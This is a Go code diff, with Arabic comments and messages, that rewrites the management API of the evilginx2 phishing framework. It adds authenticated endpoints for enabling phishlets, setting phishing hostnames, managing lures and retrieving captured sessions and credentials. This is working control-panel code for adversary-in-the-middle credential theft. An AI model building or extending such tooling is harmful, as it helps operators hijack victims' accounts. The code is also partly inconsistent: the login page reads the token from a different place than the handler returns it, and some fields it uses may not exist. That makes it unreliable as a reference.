@@ -4,11 +4,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net/http"
 	"strconv"
 	"strings"
 	"time"
 	"encoding/base64"
+	"github.com/google/uuid"
 
 	"github.com/gorilla/mux"
 	"github.com/kgretzky/evilginx2/database"
@@ -26,6 +28,8 @@ type ApiServer struct {
 	username    string
 	password    string
 	sessions    map[string]*database.Session
+	router      *mux.Router
+	authToken   string
 }
 
 type ApiResponse struct {
@@ -34,19 +38,33 @@ type ApiResponse struct {
 	Data    interface{} `json:"data,omitempty"`
 }
 
-func NewApiServer(host string, port int, basePath string, unauthPath string, cfg *Config, db *database.Database, developer bool) (*ApiServer, error) {
+// Auth لمعالجة المصادقة
+type Auth struct {
+	apiServer *ApiServer
+}
+
+// NewApiServer ينشئ خادم API جديدًا
+func NewApiServer(host string, port int, username string, password string, cfg *Config, db *database.Database) (*ApiServer, error) {
+	if cfg == nil {
+		return nil, fmt.Errorf("تكوين فارغ")
+	}
+	
+	if db == nil {
+		return nil, fmt.Errorf("قاعدة بيانات فارغة")
+	}
+	
+	// إنشاء توكن مصادقة فريد
+	token := uuid.New().String()
+	
 	return &ApiServer{
-		host:        host,
-		port:        port,
-		basePath:    basePath,
-		unauthPath:  unauthPath,
-		ip_whitelist: []string{"127.0.0.1", "::1"},
-		cfg:         cfg,
-		db:          db,
-		developer:   developer,
-		username:    "admin",
-		password:    "password123",
-		sessions:    make(map[string]*database.Session),
+		host:       host,
+		port:       port,
+		cfg:        cfg,
+		db:         db,
+		username:   username,
+		password:   password,
+		sessions:   make(map[string]*database.Session),
+		authToken:  token,
 	}, nil
 }
 
@@ -60,70 +78,86 @@ func (as *ApiServer) SetCredentials(username, password string) {
 }
 
 func (as *ApiServer) Start() {
-	r := mux.NewRouter()
-	r.UseEncodedPath()
-	r.Handle("/", http.RedirectHandler("/login.html", http.StatusFound))
+	router := mux.NewRouter()
+	router.Use(as.handleHeaders)
+	router.HandleFunc("/health", as.healthHandler).Methods("GET")
 
-	// خادم الملفات الاستاتيكية من المجلد static
-	fs := http.FileServer(http.Dir("static"))
-	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", fs))
-	r.PathPrefix("/css/").Handler(fs)
-	r.PathPrefix("/js/").Handler(fs)
-	r.PathPrefix("/images/").Handler(fs)
-	r.Handle("/login.html", fs)
-	r.Handle("/dashboard.html", fs)
-	r.Handle("/favicon.ico", fs)
+	// طرق API للمصادقة
+	router.HandleFunc("/api/login", as.loginHandler).Methods("POST")
 
-	api := r.PathPrefix("/api").Subrouter()
-	api.HandleFunc("/login", as.loginHandler).Methods("POST")
-	
-	// مسارات API التي تتطلب مصادقة
-	authorized := api.NewRoute().Subrouter()
-	authorized.Use(as.authMiddleware)
+	// إنشاء middleware للمصادقة
+	auth := &Auth{
+		apiServer: as,
+	}
 
-	authorized.HandleFunc("/configs", as.configsHandler).Methods("GET")
+	// طرق مصادقة API محمية
+	authorized := router.PathPrefix("/api").Subrouter()
+	authorized.Use(auth.authMiddleware)
+
+	// تسجيل مسارات API
+	authorized.HandleFunc("/dashboard", as.dashboardHandler).Methods("GET")
 	authorized.HandleFunc("/phishlets", as.phishletsHandler).Methods("GET")
 	authorized.HandleFunc("/phishlets/{name}", as.phishletHandler).Methods("GET")
 	authorized.HandleFunc("/phishlets/{name}/enable", as.phishletEnableHandler).Methods("POST")
 	authorized.HandleFunc("/phishlets/{name}/disable", as.phishletDisableHandler).Methods("POST")
+	authorized.HandleFunc("/configs/hostname", as.hostnameConfigHandler).Methods("POST")
 	authorized.HandleFunc("/lures", as.luresHandler).Methods("GET", "POST")
 	authorized.HandleFunc("/lures/{id:[0-9]+}", as.lureHandler).Methods("GET", "DELETE")
 	authorized.HandleFunc("/lures/{id:[0-9]+}/enable", as.lureEnableHandler).Methods("POST")
 	authorized.HandleFunc("/lures/{id:[0-9]+}/disable", as.lureDisableHandler).Methods("POST")
-	authorized.HandleFunc("/sessions", as.getSessionsHandler).Methods("GET")
-	authorized.HandleFunc("/sessions/{id}", as.getSessionHandler).Methods("GET")
+	authorized.HandleFunc("/sessions", as.sessionsHandler).Methods("GET")
+	authorized.HandleFunc("/sessions/{id}", as.sessionHandler).Methods("GET", "DELETE")
+	authorized.HandleFunc("/credentials", as.credsHandler).Methods("GET")
+
+	// خطة لتعامل مع الواجهة
+	// تعامل مع الملفات الثابتة بما فيها ملف الـ dashboard.html
+	fileServer := http.FileServer(http.Dir("./static"))
+	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", fileServer))
+	
+	// التوجيه إلى صفحة الدخول أو لوحة التحكم
+	router.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != "/" {
+			http.NotFound(w, r)
+			return
+		}
+		http.Redirect(w, r, "/static/login.html", http.StatusFound)
+	})
+
+	router.NotFoundHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		http.Error(w, "404 الصفحة غير موجودة", http.StatusNotFound)
+	})
+
+	as.router = router
 
 	bind := fmt.Sprintf("%s:%d", as.host, as.port)
 	fmt.Printf("Starting API server on: %s\n", bind)
-	go http.ListenAndServe(bind, r)
+	go http.ListenAndServe(bind, router)
 }
 
-func (as *ApiServer) authMiddleware(next http.Handler) http.Handler {
+// authMiddleware للتحقق من المصادقة
+func (auth *Auth) authMiddleware(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// التحقق من رأس Authorization
-		authHeader := r.Header.Get("Authorization")
-		if authHeader == "" {
-			as.jsonError(w, "المصادقة مطلوبة", http.StatusUnauthorized)
+		// التحقق من توكن المصادقة
+		authToken := r.Header.Get("Authorization")
+		
+		if authToken == "" {
+			cookie, err := r.Cookie("Authorization")
+			if err == nil {
+				authToken = cookie.Value
+			}
+		}
+		
+		if authToken == "" {
+			auth.apiServer.jsonError(w, "غير مصرح", http.StatusUnauthorized)
 			return
 		}
 		
-		// استخراج الرمز من الرأس
-		parts := strings.Split(authHeader, " ")
-		if len(parts) != 2 || parts[0] != "Bearer" {
-			as.jsonError(w, "تنسيق المصادقة غير صالح", http.StatusUnauthorized)
+		// التحقق من جلسة المستخدم
+		if !auth.apiServer.validateAuthToken(authToken) {
+			auth.apiServer.jsonError(w, "جلسة غير صالحة", http.StatusUnauthorized)
 			return
 		}
 		
-		token := parts[1]
-		
-		// في تطبيق حقيقي، يجب التحقق من صحة الرمز JWT
-		// للتبسيط، نتحقق فقط من أن الرمز يبدأ بـ اسم المستخدم الصحيح
-		if !validateSimpleToken(token, as.username) {
-			as.jsonError(w, "رمز غير صالح", http.StatusUnauthorized)
-			return
-		}
-		
-		// المستخدم مصادق عليه، متابعة إلى المعالج التالي
 		next.ServeHTTP(w, r)
 	})
 }
@@ -135,38 +169,47 @@ func (as *ApiServer) ipWhitelistMiddleware(next http.Handler) http.Handler {
 	})
 }
 
+// هيكل بيانات تسجيل الدخول
+type LoginRequest struct {
+	Username string `json:"username"`
+	Password string `json:"password"`
+}
+
+// هيكل بيانات استجابة تسجيل الدخول
+type LoginResponse struct {
+	Success   bool   `json:"success"`
+	Message   string `json:"message,omitempty"`
+	AuthToken string `json:"auth_token,omitempty"`
+}
+
+// معالج تسجيل الدخول
 func (as *ApiServer) loginHandler(w http.ResponseWriter, r *http.Request) {
-	defer r.Body.Close()
-	
-	var loginData struct {
-		Username string `json:"username"`
-		Password string `json:"password"`
-	}
-	
-	body, err := ioutil.ReadAll(r.Body)
-	if err != nil {
-		as.jsonError(w, "خطأ في قراءة بيانات الطلب", http.StatusBadRequest)
+	// التحقق من طريقة الطلب
+	if r.Method != "POST" {
+		http.Error(w, "طريقة غير مدعومة", http.StatusMethodNotAllowed)
 		return
 	}
 	
-	if err := json.Unmarshal(body, &loginData); err != nil {
-		as.jsonError(w, "بيانات غير صالحة", http.StatusBadRequest)
+	// فك تشفير طلب JSON
+	var loginReq LoginRequest
+	err := json.NewDecoder(r.Body).Decode(&loginReq)
+	if err != nil {
+		as.jsonError(w, "خطأ في تنسيق البيانات: "+err.Error(), http.StatusBadRequest)
 		return
 	}
 	
 	// التحقق من بيانات الاعتماد
-	if loginData.Username != as.username || loginData.Password != as.password {
-		as.jsonError(w, "بيانات اعتماد غير صحيحة", http.StatusUnauthorized)
+	if loginReq.Username != as.username || loginReq.Password != as.password {
+		as.jsonError(w, "اسم المستخدم أو كلمة المرور غير صحيحة", http.StatusUnauthorized)
 		return
 	}
 	
-	// إنشاء رمز JWT بسيط (في تطبيق حقيقي، يجب استخدام مكتبة JWT مناسبة)
-	token := generateSimpleToken(loginData.Username)
-	
-	// إرسال الرمز في الاستجابة
+	// استجابة ناجحة مع توكن المصادقة
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]string{
-		"token": token,
+	json.NewEncoder(w).Encode(LoginResponse{
+		Success:   true,
+		Message:   "تم تسجيل الدخول بنجاح",
+		AuthToken: as.authToken,
 	})
 }
 
@@ -543,7 +586,7 @@ const loginHTML = `<!DOCTYPE html>
                 
                 if (data.success) {
                     // تخزين الرمز في localStorage
-                    localStorage.setItem('authToken', data.data.token);
+                    localStorage.setItem('authToken', data.data.auth_token);
                     // توجيه إلى الصفحة الرئيسية
                     window.location.href = '/dashboard.html';
                 } else {
@@ -581,49 +624,67 @@ func (as *ApiServer) configsHandler(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
-// معالج قائمة Phishlets
-func (as *ApiServer) phishletsHandler(w http.ResponseWriter, r *http.Request) {
-	phishlets := []map[string]interface{}{}
-	
-	for _, p := range as.cfg.phishlets {
-		phishletData := map[string]interface{}{
-			"name":        p.Name,
-			"author":      p.Author,
-			"description": p.Author,
-			"enabled":     p.isTemplate || as.cfg.IsSiteEnabled(p.Name),
-			"domains":     p.domains,
-		}
-		phishlets = append(phishlets, phishletData)
-	}
-	
-	as.jsonResponse(w, ApiResponse{
-		Success: true,
-		Data:    phishlets,
-	})
+// نموذج بيانات الـ Phishlet للواجهة
+type ApiPhishlet struct {
+	Name        string `json:"name"`
+	Hostname    string `json:"hostname"`
+	IsActive    bool   `json:"is_active"`
+	IsTemplate  bool   `json:"is_template"`
+	Author      string `json:"author"`
+	Description string `json:"description"`
 }
 
-// معالج تفاصيل Phishlet محدد
+// معالج للحصول على معلومات phishlet محدد
 func (as *ApiServer) phishletHandler(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	name := vars["name"]
-	
-	p, err := as.cfg.GetPhishlet(name)
+
+	phishlet, err := as.cfg.GetPhishlet(name)
 	if err != nil {
-		as.jsonError(w, err.Error(), http.StatusNotFound)
+		as.jsonError(w, fmt.Sprintf("لم يتم العثور على الـ phishlet '%s': %v", name, err), http.StatusNotFound)
 		return
 	}
-	
-	phishletData := map[string]interface{}{
-		"name":        p.Name,
-		"author":      p.Author,
-		"description": p.Author,
-		"enabled":     p.isTemplate || as.cfg.IsSiteEnabled(p.Name),
-		"domains":     p.domains,
+
+	apiPhishlet := ApiPhishlet{
+		Name:        phishlet.Name,
+		Hostname:    phishlet.Hostname,
+		IsActive:    phishlet.IsActive,
+		IsTemplate:  phishlet.IsTemplate,
+		Author:      phishlet.Author,
+		Description: phishlet.Description,
 	}
-	
+
 	as.jsonResponse(w, ApiResponse{
 		Success: true,
-		Data:    phishletData,
+		Message: fmt.Sprintf("تم الحصول على معلومات الـ phishlet '%s'", name),
+		Data:    apiPhishlet,
+	})
+}
+
+// تعديل معالج قائمة الـ phishlets لاستخدام نموذج البيانات الجديد
+func (as *ApiServer) phishletsHandler(w http.ResponseWriter, r *http.Request) {
+	// الحصول على معلومات جميع الـ phishlets
+	phishlets := as.cfg.GetPhishlets()
+	apiPhishlets := make([]ApiPhishlet, 0)
+
+	for _, phishlet := range phishlets {
+		if !phishlet.IsHidden {
+			apiPhishlet := ApiPhishlet{
+				Name:        phishlet.Name,
+				Hostname:    phishlet.Hostname,
+				IsActive:    phishlet.IsActive,
+				IsTemplate:  phishlet.IsTemplate,
+				Author:      phishlet.Author,
+				Description: phishlet.Description,
+			}
+			apiPhishlets = append(apiPhishlets, apiPhishlet)
+		}
+	}
+
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: "تم استرجاع قائمة الـ phishlets بنجاح",
+		Data:    apiPhishlets,
 	})
 }
 
@@ -631,16 +692,41 @@ func (as *ApiServer) phishletHandler(w http.ResponseWriter, r *http.Request) {
 func (as *ApiServer) phishletEnableHandler(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	name := vars["name"]
-	
-	err := as.cfg.SetSiteEnabled(name)
+
+	// التحقق من وجود الـ phishlet
+	pl, err := as.cfg.GetPhishlet(name)
 	if err != nil {
+		as.jsonError(w, "phishlet غير موجود: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	// التحقق مما إذا كان الـ phishlet مُفعل بالفعل
+	if pl.IsActive {
+		as.jsonResponse(w, ApiResponse{
+			Success: true,
+			Message: fmt.Sprintf("الـ phishlet '%s' مُفعل بالفعل", name),
+		})
+		return
+	}
+
+	// التحقق من hostname
+	if pl.Hostname == "" {
+		as.jsonError(w, fmt.Sprintf("لم يتم تعيين hostname للـ phishlet '%s'", name), http.StatusBadRequest)
+		return
+	}
+
+	// محاولة تفعيل الـ phishlet مع تسجيل أي أخطاء
+	fmt.Printf("محاولة تفعيل الـ phishlet: %s\n", name)
+	err = as.cfg.SetSiteEnabled(name)
+	if err != nil {
+		fmt.Printf("فشل في تفعيل الـ phishlet '%s': %v\n", name, err)
 		as.jsonError(w, err.Error(), http.StatusInternalServerError)
 		return
 	}
-	
+
 	as.jsonResponse(w, ApiResponse{
 		Success: true,
-		Message: fmt.Sprintf("Phishlet '%s' enabled", name),
+		Message: fmt.Sprintf("تم تفعيل الـ phishlet '%s' بنجاح", name),
 	})
 }
 
@@ -649,9 +735,28 @@ func (as *ApiServer) phishletDisableHandler(w http.ResponseWriter, r *http.Reque
 	vars := mux.Vars(r)
 	name := vars["name"]
 	
-	err := as.cfg.SetSiteDisabled(name)
+	// التحقق من وجود الـ phishlet أولًا
+	_, err := as.cfg.GetPhishlet(name)
 	if err != nil {
-		as.jsonError(w, err.Error(), http.StatusInternalServerError)
+		as.jsonError(w, fmt.Sprintf("Phishlet '%s' not found: %v", name, err), http.StatusNotFound)
+		return
+	}
+	
+	// التحقق مما إذا كان الـ phishlet معطلًا بالفعل
+	if !as.cfg.IsSiteEnabled(name) {
+		as.jsonResponse(w, ApiResponse{
+			Success: true,
+			Message: fmt.Sprintf("Phishlet '%s' is already disabled", name),
+		})
+		return
+	}
+	
+	// محاولة تعطيل الـ phishlet
+	err = as.cfg.SetSiteDisabled(name)
+	if err != nil {
+		// طباعة الخطأ للتصحيح
+		fmt.Printf("Error disabling phishlet '%s': %v\n", name, err)
+		as.jsonError(w, fmt.Sprintf("Failed to disable phishlet '%s': %v", name, err), http.StatusInternalServerError)
 		return
 	}
 	
@@ -836,4 +941,69 @@ func (as *ApiServer) lureDisableHandler(w http.ResponseWriter, r *http.Request) 
 		Success: true,
 		Message: fmt.Sprintf("Lure %d disabled", id),
 	})
+}
+
+// هيكل بيانات تكوين hostname
+type HostnameConfig struct {
+	Phishlet string `json:"phishlet"`
+	Hostname string `json:"hostname"`
+}
+
+// معالج تكوين hostname
+func (as *ApiServer) hostnameConfigHandler(w http.ResponseWriter, r *http.Request) {
+	var hostnameConfig HostnameConfig
+	err := json.NewDecoder(r.Body).Decode(&hostnameConfig)
+	if err != nil {
+		as.jsonError(w, "خطأ في تنسيق البيانات: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	if hostnameConfig.Phishlet == "" {
+		as.jsonError(w, "اسم الـ phishlet مطلوب", http.StatusBadRequest)
+		return
+	}
+
+	if hostnameConfig.Hostname == "" {
+		as.jsonError(w, "hostname مطلوب", http.StatusBadRequest)
+		return
+	}
+
+	// التحقق من وجود الـ phishlet
+	_, err = as.cfg.GetPhishlet(hostnameConfig.Phishlet)
+	if err != nil {
+		as.jsonError(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	// تحديث hostname
+	fmt.Printf("محاولة تعيين hostname للـ phishlet '%s' إلى '%s'\n", hostnameConfig.Phishlet, hostnameConfig.Hostname)
+	success := as.cfg.SetSiteHostname(hostnameConfig.Phishlet, hostnameConfig.Hostname)
+	if !success {
+		as.jsonError(w, fmt.Sprintf("فشل في تحديث hostname للـ phishlet '%s'. تأكد من أن النطاق ينتهي بـ '%s'", 
+			hostnameConfig.Phishlet, as.cfg.GetBaseDomain()), http.StatusInternalServerError)
+		return
+	}
+
+	// يجب تعطيل الـ phishlet بعد تغيير hostname
+	if as.cfg.IsSiteEnabled(hostnameConfig.Phishlet) {
+		err = as.cfg.SetSiteDisabled(hostnameConfig.Phishlet)
+		if err != nil {
+			log.Printf("خطأ أثناء تعطيل الـ phishlet بعد تحديث hostname: %v", err)
+		}
+	}
+
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: fmt.Sprintf("تم تحديث hostname للـ phishlet '%s' بنجاح", hostnameConfig.Phishlet),
+	})
+}
+
+// validateAuthToken للتحقق من صحة توكن المصادقة
+func (as *ApiServer) validateAuthToken(token string) bool {
+	return token == as.authToken
+}
+
+// GetBaseDomain يحصل على النطاق الأساسي من التكوين
+func (as *ApiServer) GetBaseDomain() string {
+	return as.cfg.GetBaseDomain()
 } 
